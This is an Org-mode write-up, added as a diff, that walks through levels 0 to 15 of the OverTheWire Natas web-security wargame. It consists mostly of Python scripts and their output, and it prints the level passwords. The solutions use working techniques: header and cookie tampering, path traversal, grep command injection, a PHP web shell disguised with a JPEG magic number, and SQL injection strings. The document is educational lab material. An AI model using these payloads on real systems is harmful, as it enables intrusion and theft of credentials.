@@ -1,0 +1,727 @@
+#+TITLE: Natas (OverTheWire)
+#+AUTHOR: Bryan Rinders
+#+DATE: 2022-10-16
+
+* Introduction
+This is a writeup for the [[https://overthewire.org/wargames/][overthewire.org]] war game Natas. To start a level 
+visit the URL http://natasX.natas.labs.overthewire.org, and login with 
+username: natasX and the password found in the previous level, where X is the 
+level number. 
+All passwords for the next level are also stored in
+/etc/natas_webpass/natasX, where X is the number of the level.
+
+* Level 0
+View the source page and find the password:
+
+#+BEGIN_SRC sh
+curl -u natas0:natas0 "http://natas0.natas.labs.overthewire.org/" | grep natas1
+#+END_SRC
+
+#+RESULTS:
+: <!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
+
+Result:
+#+BEGIN_SRC 
+: <!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
+#+END_SRC
+
+* Level 1
+View the source page by using a short cut key (for me <C-u>, Ctrl+u):
+
+#+BEGIN_SRC sh
+curl -u natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto  "http://natas1.natas.labs.overthewire.org/" | grep natas2
+#+END_SRC
+
+#+RESULTS:
+: <!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
+
+Result:
+#+BEGIN_SRC 
+: <!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
+#+END_SRC
+
+* Level 2
+Again view the source page. There is a line with a link to an image 
+
+#+BEGIN_SRC 
+<img src="files/pixel.png">
+#+END_SRC
+
+This links to "http://natas2.natas.labs.overthewire.org/files/pixel.png", note 
+the /files/pixels.png. Which means it might be possible to explorer the files 
+'files' directory. Exploring "http://natas2.natas.labs.overthewire.org/files/" 
+it shows that there it another file called 'users.txt' which contains the 
+password for the next level.
+
+#+BEGIN_SRC sh
+curl -u natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi "http://natas2.natas.labs.overthewire.org/files/users.txt" | grep natas3
+#+END_SRC
+
+#+RESULTS:
+: natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+
+Result:
+#+BEGIN_SRC 
+: natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+#+END_SRC
+
+* Level 3
+View the source and find the line
+
+#+BEGIN_SRC 
+<!-- No more information leaks!! Not even Google will find it this time... -->
+#+END_SRC
+
+which hints at the 'robots.txt' file that contains the directories webcrawlers are not supossed to visit. From the 'robots.txt' we get the directory '/s3cr3t/' which contains the 'users.txt' file with the password for natas4.
+
+#+BEGIN_SRC sh
+curl -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 "http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt" | grep natas4
+#+END_SRC
+
+#+RESULTS:
+: natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+Result:
+#+BEGIN_SRC 
+: natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+#+END_SRC
+
+* Level 4
+To get access to the password we need to come from the natas5 website as is 
+metioned on the website when first loging in. 
+#+BEGIN_SRC 
+Access disallowed. You are visiting from "" while authorized users should come 
+only from "http://natas5.natas.labs.overthewire.org/"
+#+END_SRC
+It is possible to simulate this by setting the referer in the header of the get
+request to the natas5 website.
+
+First define a function that can find the password in the raw html text:
+
+#+NAME: 373e98c9-ce75-4f43-921a-289dfacae023
+#+BEGIN_SRC ein-python :session :async :results output 
+def find_pswd(text):
+    # find the line with the password in the html text
+    lines = text.split('\n')
+    bools = list(map(lambda x : "password" in x, lines))
+    for (b,line) in zip(bools,lines):
+        if b:
+            return line
+#+END_SRC
+
+#+RESULTS: 373e98c9-ce75-4f43-921a-289dfacae023
+
+Now the code that change the referer to natas5:
+
+#+NAME: c24a72b1-d2b5-4377-8762-815c67a7d6cd
+#+BEGIN_SRC ein-python :session :async :results output 
+# The code is written in python
+import requests
+from requests.auth import HTTPBasicAuth
+
+user = "natas4"
+pswd = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"
+url = "http://natas4.natas.labs.overthewire.org/"
+headers = {'referer': 'http://natas5.natas.labs.overthewire.org/'}
+
+# get request with the referer set to natas5
+r = requests.get(url, headers=headers, auth=HTTPBasicAuth(user,pswd))
+
+print(find_pswd(r.text))
+#+END_SRC
+
+#+RESULTS: c24a72b1-d2b5-4377-8762-815c67a7d6cd
+: Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+Result:
+#+BEGIN_SRC 
+: Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+#+END_SRC
+
+* Level 5
+After logging in the web page shows:
+
+#+BEGIN_SRC 
+Access disallowed. You are not logged in
+#+END_SRC
+
+Lets inspect the headers to see what is happening
+
+#+NAME: 575ee3fe-cc0f-4b76-bf91-927f3fe97c0c
+#+BEGIN_SRC ein-python :session :async :results output
+# The code is written in python
+import requests
+from requests.auth import HTTPBasicAuth
+
+user = "natas5"
+pswd = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"
+url = "http://natas5.natas.labs.overthewire.org/"
+
+r = requests.get(url, auth=HTTPBasicAuth(user,pswd))
+print(r.headers)
+#+END_SRC
+
+#+RESULTS: 575ee3fe-cc0f-4b76-bf91-927f3fe97c0c
+: {'Date': 'Sat, 05 Mar 2022 14:18:12 GMT', 'Server': 'Apache/2.4.10 (Debian)', 'Set-Cookie': 'loggedin=0', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '367', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=UTF-8'}
+
+Result:
+#+BEGIN_SRC 
+: {'Date': 'Sat, 05 Mar 2022 10:28:27 GMT', 'Server': 'Apache/2.4.10 (Debian)', 'Set-Cookie': 'loggedin=0', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '367', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=UTF-8'}
+#+END_SRC
+
+The output show that the the Set-cookie loggedin=0, if that is changed to 
+loggedin=1 then that should give access to the password.
+
+#+NAME: 35846085-d24d-4f0a-beb1-6538bb4b9471
+#+BEGIN_SRC ein-python :session :async :results output
+cookies = {'loggedin': '1'}
+
+# get request with the cookie set loggedin=1
+r = requests.get(url, cookies=cookies, auth=HTTPBasicAuth(user,pswd))
+
+# find the line with the password in it
+print(find_pswd(r.text))
+#+END_SRC
+
+#+RESULTS: 35846085-d24d-4f0a-beb1-6538bb4b9471
+: Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
+
+Result:
+#+BEGIN_SRC 
+: Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
+#+END_SRC
+
+* Level 6
+After logging in we are prompted to input a secret. The source contains the line:
+#+BEGIN_SRC 
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+#+END_SRC
+Then going to the url view-source:http://natas6.natas.labs.overthewire.org/index-source.html contains:
+#+BEGIN_SRC 
+include "includes/secret.inc";
+#+END_SRC
+follow this to the url http://natas6.natas.labs.overthewire.org/includes/secret.inc, which reveals the secret: "FOEIUWGHFEEUHOFUOIU"
+
+#+NAME: 357e147d-fa57-479d-bffb-c2131c2736b1
+#+BEGIN_SRC ein-python :session :async :results output
+user = "natas6"
+pswd = "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"
+url = "http://natas6.natas.labs.overthewire.org/"
+post_data = {"secret": "FOEIUWGHFEEUHOFUOIU", "submit": "submit"}
+
+# get request with the referer set to natas5
+r = requests.post(url, auth=HTTPBasicAuth(user,pswd), data=post_data)
+
+print(find_pswd(r.text))
+#+END_SRC
+
+#+RESULTS: 357e147d-fa57-479d-bffb-c2131c2736b1
+: Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+Result:
+#+BEGIN_SRC 
+: Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+#+END_SRC
+
+* Level 7
+The source page says:
+#+BEGIN_SRC 
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+#+END_SRC
+
+and there are two links for 'Home' and 'About', 'index.php?page=Home' and 'index.php?page=About respectively. Changing either 'Home' or 'About' with the path to the password file will give access to the password, i.e. =/index.php?page=/etc/natas_webpass/natas8=.
+
+#+NAME: 357e147d-fa57-479d-bffb-c2131c2736b1
+#+BEGIN_SRC ein-python :session :async :results output
+user = "natas7"
+pswd = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"
+url = "http://natas7.natas.labs.overthewire.org/"
+location = "/index.php?page=/etc/natas_webpass/natas8"
+
+# get request with the referer set to natas5
+r = requests.post(url+location, auth=HTTPBasicAuth(user,pswd))
+
+print(r.text.split('\n')[-7])
+#+END_SRC
+
+Result:
+#+BEGIN_SRC 
+: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+#+END_SRC
+
+* Level 8
+The source page again has a link to:
+#+BEGIN_SRC 
+index-source.html
+#+END_SRC
+which reveals an encoded secret:
+#+BEGIN_SRC 
+3d3d516343746d4d6d6c315669563362
+#+END_SRC
+it is encoded with this function:
+#+BEGIN_SRC 
+function encodeSecret($secret) {
+    return bin2hex(strrev(base64_encode($secret)));
+}
+#+END_SRC
+All we need to do is reverse this function on the given encoded secret:
+#+NAME: b1f4b49f-258f-4796-97f0-04354b76dbc7
+#+BEGIN_SRC ein-python :session :async :results output
+import base64
+
+secret = "3d3d516343746d4d6d6c315669563362"
+# convert hex to binary
+binary_secret = bin(int(secret, 16))
+# convert the bits to a string of chars
+char_secret = ''.join(chr(int(binary_secret[i*8:i*8+8],2)) for i in range(len(binary_secret)//8))
+# reverse the string
+reverse_secret  = char_secret[::-1]
+# base64 decode the string
+#decoded_secret = base64.b64decode(reverse_secret.encode("ascii")).decode("ascii")
+decoded_secret = base64.b64decode(reverse_secret).decode("ascii")
+print("The decoded secret is: " + decoded_secret)
+#+END_SRC
+
+#+RESULTS: b1f4b49f-258f-4796-97f0-04354b76dbc7
+: The decoded secret is: oubWYf2kBq
+
+Result:
+#+BEGIN_SRC 
+: The decoded secret is: oubWYf2kBq
+#+END_SRC
+
+Now we can POST the secret to get the password.
+
+#+NAME: ffed605a-7f2d-476f-916f-4274eeb93861
+#+BEGIN_SRC ein-python :session :async :results output
+user = "natas8"
+pswd = "DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe"
+url = "http://natas8.natas.labs.overthewire.org/"
+post_data = {"secret": "oubWYf2kBq", "submit": "submit"}
+
+# get request with the referer set to natas5
+r = requests.post(url, auth=HTTPBasicAuth(user,pswd), data=post_data)
+
+print(find_pswd(r.text))
+#+END_SRC
+
+#+RESULTS: ffed605a-7f2d-476f-916f-4274eeb93861
+: Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+Result:
+#+BEGIN_SRC 
+: Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+#+END_SRC
+
+* Level 9
+On the site there is a search box that searches for words. Trying out some words in the search box shows that it actual does find all words containing the searched string. Inspecting the source reveals this piece of code:
+
+#+BEGIN_SRC 
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+#+END_SRC
+
+So it is using grep to find results from 'dictionary.txt', but grep allows for multiple input files to search in and so if we input an extra file into the search box then it will search that file as well as 'dictionary.txt'. The file we want to include in the submit box is 'etc/natas_webpass/natas10', the file that holds the password for the next level.
+
+#+NAME: 619000f1-8434-46c7-b266-93ffa3dce6c4
+#+BEGIN_SRC ein-python :session :async :results output
+import re
+
+user = "natas9"
+pswd = "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"
+url = "http://natas9.natas.labs.overthewire.org/"
+post_data = {"needle": "'' /etc/natas_webpass/natas10", "submit": "submit"}
+
+# get request with the referer set to natas5
+r = requests.post(url, auth=HTTPBasicAuth(user,pswd), data=post_data)
+
+print(re.findall('/etc/natas_webpass/natas10:(.*)', r.text)[0])
+#+END_SRC
+
+#+RESULTS: 619000f1-8434-46c7-b266-93ffa3dce6c4
+: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+Result:
+#+BEGIN_SRC 
+: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+#+END_SRC
+
+* Level 10
+This level is similar to the previous level but it checks if there are "illegal" characters in the input.
+
+#+BEGIN_SRC 
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+#+END_SRC
+
+From the regular expression in 'preg_match' the illegal characters are ';' and '&'. Since those characters weren't used in the previous level it is possible to re-use the 'needle' from level 9.
+
+#+NAME: 055fa6f2-0ca1-4a7b-8b10-11a489b8da05
+#+BEGIN_SRC ein-python :session :async :results output
+user = "natas10"
+pswd = "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"
+url = "http://natas10.natas.labs.overthewire.org/"
+post_data = {"needle": "'' /etc/natas_webpass/natas11", "submit": "submit"}
+
+# get request with the referer set to natas5
+r = requests.post(url, auth=HTTPBasicAuth(user,pswd), data=post_data)
+
+print(re.findall('/etc/natas_webpass/natas11:(.*)', r.text)[0])
+#+END_SRC
+
+#+RESULTS: 055fa6f2-0ca1-4a7b-8b10-11a489b8da05
+: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+Result:
+#+BEGIN_SRC 
+: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+#+END_SRC
+
+* Level 11
+** Intro
+From the source code, these are the most important functions/variables:
+
+#+BEGIN_SRC 
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+
+function xor_encrypt($in) {
+    $key = '<censored>';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+        $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+function saveData($d) {
+    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+}
+
+#+END_SRC
+
+The =xor_encrypt()= function simply encrypts the input with a censored key. And the =saveData()= creates a cookie from the =$defaultdata=. The first thing to do is get a cookie. With this cookie and the =defaultdata= it is possible to exploit a property of the xor function, namely: =plaintext ^ key = ciphertext= can be rewritten to solve for the key like =plaintext ^ ciphertext = key=. Hence we can find the key with ~plaintext = $defaultdata~ and ~ciphertext = cookie~.
+
+** Get the cookie (cipher text)
+So lets get a cookie:
+
+#+NAME: 8381cf49-5198-44c0-b89b-106bfd562d88
+#+BEGIN_SRC ein-python :session :async :results output
+import requests
+from requests.auth import HTTPBasicAuth
+import re
+
+user = "natas11"
+pswd = "U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK"
+url = "http://natas11.natas.labs.overthewire.org/"
+data = {"bgcolor": "#000000", "submit": "Set color"}
+
+# get request with the referer set to natas5
+r = requests.post(url, auth=HTTPBasicAuth(user,pswd), data=data)
+
+cookie = r.headers['Set-Cookie'][5:]
+print(r.headers)
+print(f'The cookie is: {cookie}')
+#print(re.findall('/etc/natas_webpass/natas11:(.*)', r.text)[0])
+#+END_SRC
+
+#+RESULTS: 8381cf49-5198-44c0-b89b-106bfd562d88
+: {'Date': 'Tue, 28 Jun 2022 08:45:37 GMT', 'Server': 'Apache/2.4.10 (Debian)', 'Set-Cookie': 'data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRwh6QUcIaAw%3D', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '491', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=UTF-8'}
+: The cookie is: ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRwh6QUcIaAw%3D
+
+Results:
+#+BEGIN_SRC 
+: The cookie is: ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRwh6QUcIaAw%3D
+#+END_SRC
+
+This cookie is url encode as can be seen by the %3D at the end. Lets decode it:
+
+#+NAME: f2889434-8782-4bb9-84cb-47d9e28ff295
+#+BEGIN_SRC ein-python :session :async :results output
+from urllib.parse import unquote
+import base64 
+
+cookie = unquote(cookie)
+print(f'The url decoded cookie is: {cookie}')
+cookie = b64decode(cookie).hex()
+print(f'The cookie/cipher text in hex is: {cookie}')
+
+#+END_SRC
+
+#+RESULTS: f2889434-8782-4bb9-84cb-47d9e28ff295
+: The url decoded cookie is: ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRwh6QUcIaAw=
+: The base 64 decoded cookie in hex is:
+: 0a554b221e00482b02044f2503131a70531957685d555a2d12185425035502685247087a414708680c
+
+Results:
+#+BEGIN_SRC 
+: The url decoded cookie is: ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRwh6QUcIaAw=
+: The cookie/cipher text in hex is: 0a554b221e00482b02044f2503131a70531957685d555a2d12185425035502685247087a414708680c
+#+END_SRC
+
+** Get the plain text
+Now to get the plaintext that is used in the =xor_encrypt()= the =savedata()= json_encode the =defaultdata= first. 
+
+#+BEGIN_SRC 
+// this is php code:
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+json_encode($defaultdata);
+echo (json_encode($defaultdata));
+
+#+END_SRC
+
+Result:
+#+BEGIN_SRC 
+{"showpassword":"no","bgcolor":"#ffffff"}
+#+END_SRC
+
+** Find the encryption key
+Now use the plain and cipher text in a slightly rewritten =xor_encrypt()= to find the key.
+
+#+BEGIN_SRC 
+// this is php code:
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+
+function xor_encrypt($in, $key) {
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+        $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+$plain = json_encode($defaultdata);
+$cipher = hex2bin('0a554b221e00482b02044f2503131a70531957685d555a2d12185425035502685247087a414708680c');
+
+echo ('The key is: ' . xor_encrypt($plain, $cipher));
+
+#+END_SRC
+
+Result:
+#+BEGIN_SRC 
+The key is: qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq!n'!nJq
+#+END_SRC
+
+The is a pattern in the key which means that the key that was used is the substring =qw8J=.
+
+** Get the password for natas12
+To get the password change the =showpassword= value from the array =$defaultdata= to "yes". Then encrypt the array with the key =qw8J=. This will result in the value that should be send as the cookie and will give the password.
+
+#+BEGIN_SRC 
+// this is php code:
+$defaultdata = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
+
+function xor_encrypt($in, $key) {
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+        $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+$plain = json_encode($defaultdata);
+$key = 'qw8J';
+
+echo ('The cipher text is: ' . base64_encode(xor_encrypt($plain, $key)));
+
+#+END_SRC
+
+Result:
+#+BEGIN_SRC 
+The cipher text is: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+#+END_SRC
+
+Use the just computed cipher text as the cookie and send a get request with the cookie attached. This will show the password for Natas 12.
+
+#+NAME: fbe86215-eff2-4f43-89ed-a2ed9936be6b
+#+BEGIN_SRC ein-python :session :async :results output
+import requests
+from requests.auth import HTTPBasicAuth
+import re
+
+user = "natas11"
+pswd = "U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK"
+url = "http://natas11.natas.labs.overthewire.org/"
+data = {"bgcolor": "#000000", "submit": "Set color"}
+cookies = {'data': 'ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'}
+
+# get request with the referer set to natas5
+r = requests.get(url, cookies=cookies, auth=HTTPBasicAuth(user,pswd))
+
+print(re.findall('The password for natas12 is (.*)<br>', r.text)[0])
+
+#+END_SRC
+
+#+RESULTS: fbe86215-eff2-4f43-89ed-a2ed9936be6b
+: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
+Result:
+#+BEGIN_SRC 
+: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+#+END_SRC
+
+* Natas 12
+The webpage asks for .jpg files to be uploaded. After uploading a picture a link is given to the location, =upload/<randomstring>.jpg=, of the uploaded file. I tried a few path traversal attacks, e.g. =/upload/../etc/natas_webpass/natas13=, but all failed. So maybe it is possible to upload some malicious php code instead of a jpg.
+
+Create a php file called =evil.php= that contains:
+#+BEGIN_SRC 
+<?php echo (file_get_contents('/etc/natas_webpass/natas13')); ?>
+#+END_SRC
+This will print the password for natas13.
+
+Now the python script that uploads =evil.php= to the website and gets the randon link to the uploaded file location, which should contain the password for natas13.
+
+#+NAME: fe38f6a0-8603-4e69-a7a6-411de3b263eb
+#+BEGIN_SRC ein-python :session :async :results output
+import requests
+from requests.auth import HTTPBasicAuth
+import re
+
+user = "natas12"
+pswd = "EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"
+url = "http://natas12.natas.labs.overthewire.org/"
+
+evil = {'uploadedfile': open('/home/br/Pictures/shots/evil.php', 'rb')}
+
+# get request with the referer set to natas5
+r = requests.post(url, auth=HTTPBasicAuth(user,pswd), files=evil, data={'filename': 'evil.php'})
+
+path = re.findall('href="(upload/.*.php)">', r.text)[0]
+print('The path to our uploaded file: ' + path + '\n')
+
+r1 = requests.get(url+path, auth=HTTPBasicAuth(user,pswd))
+print('The password for natas13: ' + r1.text)
+
+#+END_SRC
+
+#+RESULTS: fe38f6a0-8603-4e69-a7a6-411de3b263eb
+: The path to our uploaded file: upload/tdxpbrtuna.php
+: 
+: The password for natas13: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+: 
+
+#+BEGIN_SRC 
+: The path to our uploaded file: upload/tdxpbrtuna.php
+: 
+: The password for natas13: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+#+END_SRC
+
+* Natas 13
+This level is similar to level 12 but it uses =exif_imagetype= to check if the file being uploaded is actually an image. It does this by checking the /magic number/ at the beginning of the file. So if we can insert this /magic number/ to the beginning of our php script than it will pass the =exif_imagetype= check will the server will execute the contents of the file. We will insert the /magic number/ by letting python write it to the file in bytes. The rest of the attack is very similar to level 12. The /magic number/ is =\xFF\xD8\xFF\xE0=.
+
+#+NAME: 011b3929-4d37-4815-a3c2-d11cb3f20162
+#+BEGIN_SRC ein-python :session :async :results output
+  import requests
+  from requests.auth import HTTPBasicAuth
+  import re
+
+  user = "natas13"
+  pswd = "jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY"
+  url = "http://natas13.natas.labs.overthewire.org/"
+  
+  # write the magic number and the to be executed php to evilFile
+  evilFile = '/home/br/Pictures/shots/evil3.php'
+  fh = open(evilFile, 'wb')
+  fh.write(b'\xFF\xD8\xFF\xE0' + b'<? passthru($_GET["cmd"]); ?>')
+  fh.close()
+
+  evil = {'uploadedfile': open(evilFile, 'rb')}
+
+  # Post the evilFile to the server
+  r = requests.post(url, auth=HTTPBasicAuth(user,pswd), files=evil, data={'filename': 'evil3.php'})
+
+  # print(r.text)
+
+  path = re.findall('href="(upload/.*.php)">', r.text)[0]
+  print(f'The path to our uploaded file: {path}\n')
+
+  r1 = requests.get(url+path+'?cmd=cat /etc/natas_webpass/natas14', auth=HTTPBasicAuth(user,pswd))
+  print(f'The password for natas13: {r1.text[4:]}')
+
+#+END_SRC
+
+#+RESULTS: 011b3929-4d37-4815-a3c2-d11cb3f20162
+: The path to our uploaded file: upload/4ttajmtyw5.php
+: 
+: The password for natas13: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+: 
+
+Result:
+#+BEGIN_SRC 
+: The path to our uploaded file: upload/ijapb8ongh.php
+: 
+: The password for natas13: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+#+END_SRC
+
+* Natas 14
+This level has a login form. The source code reveals the use of very simple sql queries, which means we could try some [[https://en.wikipedia.org/wiki/SQL_injection#Incorrectly_constructed_SQL_statements][sql injections]]. The very first try immediately worked, supplying ~" or 1=1 --~ for both the username and the password.
+
+#+NAME: 52c020c6-6a93-4f1e-8734-95d5f747a7fa
+#+BEGIN_SRC ein-python :session :async :results output
+  import requests
+  from requests.auth import HTTPBasicAuth
+  import re
+
+  user = "natas14"
+  pswd = "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"
+  url = "http://natas14.natas.labs.overthewire.org/"
+  data = {'username': '" or 1=1 --', 'password': '" or 1=1 --'}
+
+  r = requests.post(url, auth=HTTPBasicAuth(user,pswd), data=data)
+
+  # print(r.text)
+
+  print(re.findall('password for natas15 is (.*)<br>', r.text)[0])
+
+#+END_SRC
+
+#+RESULTS: 52c020c6-6a93-4f1e-8734-95d5f747a7fa
+: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+Result:
+#+BEGIN_SRC 
+: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+#+END_SRC
+
+* Natas 15
+
+#+BEGIN_SRC ein-python :session :async :results output
+  import requests
+  from requests.auth import HTTPBasicAuth
+  import re
+
+  user = "natas15"
+  pswd = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
+  url = "http://natas15.natas.labs.overthewire.org/"
+  data = {'username': '" or 1=1 --', 'password': '" or 1=1 --'}
+
+  r = requests.post(url, auth=HTTPBasicAuth(user,pswd), data=data)
+
+  print(r.text)
+
+  # print(re.findall('password for natas15 is (.*)<br>', r.text)[0])
+
+#+END_SRC
+
+
+#+BEGIN_SRC ein-python :session :async :results output
+
+
+#+END_SRC
